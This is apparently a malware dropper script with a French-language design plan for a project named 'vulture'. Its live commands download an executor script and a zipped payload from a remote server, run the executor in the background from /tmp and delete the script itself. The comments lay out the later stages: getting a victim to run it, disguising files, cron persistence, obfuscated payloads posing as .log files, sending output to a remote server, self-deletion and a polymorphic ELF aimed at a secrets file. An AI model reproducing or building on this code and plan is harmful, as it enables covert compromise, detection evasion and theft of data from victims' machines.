#wget http://192.168.1.126:8888/backup.log -o /usr/src/log/backup.log
wget http://192.168.1.126:8888/tools/vulture_executioner.sh
wget http://192.168.1.126:8888/tools/vulture_poly.zip
mv vulture_* /tmp
sleep 3
./tmp/vulture_executioner.sh &
rm -- "$0"
# need to add a command to delete itself

# résumé cours:
# Jordan télécharge ça -> vulture_seeker.sh  1
# -> le camoufler si possible
# -> utiliser mon vps si possible
# le seeker télécharge -> vulture_executioner.sh et le met dans /tmp 2
# le seeker télécharge aussi -> vulture_poly.zip 3
# -> camoufler le zip dans un autre document
# l'executioner compile et execute -> vulture_poly et ajoute au cronjob 4
# si l'execution est bonne il supprime tout le monde et lui même, met le binaire poly autrepart 5

# track :
# pre-stage
# A. bad-bash.sh telecharge un fichier pre-obfusqué et le copie dans /usr/src/log (on renommera le fichier en .log)
# B. bad-bash.sh telecharge ensuite un deobfuscateur et le met dans /tmp et ajoute son éxécution aux cronjobs tt les minutes
# C. bad-bash.sh se supprime et supprime toutes ses instances
#
# Bonus pre-stage:
# le hash du fichier télécharger est stocké sur le serveur distant

# stage 0:
# A. deobfuscateur.sh tente d'éxécuter le fichier log cible (le payload) dans un fd tmp et renvoie l'output sur le SRV distant
# B. deobfuscateur.sh supprime le fd tmp
#
# BONUS Stage 0:
# A. deobfuscateur.sh se réécrit après 2 éxécution en boucle
# B. deobfuscateur.sh fait une requête au server distant pour avoir la clé. Cette requête contient le hash256 du fichier cible
# si le hash coincide au hash sur le server distant, on répond avec un clé pour autorisé l'éxécution, sinon on répond avec un clé qui supprime tout


# Stage 1:
#
# A. le malware en elf change sa signature à chaque fois qu'il est éxécuté, il va viser le fichier 'sensitive_info.secret'
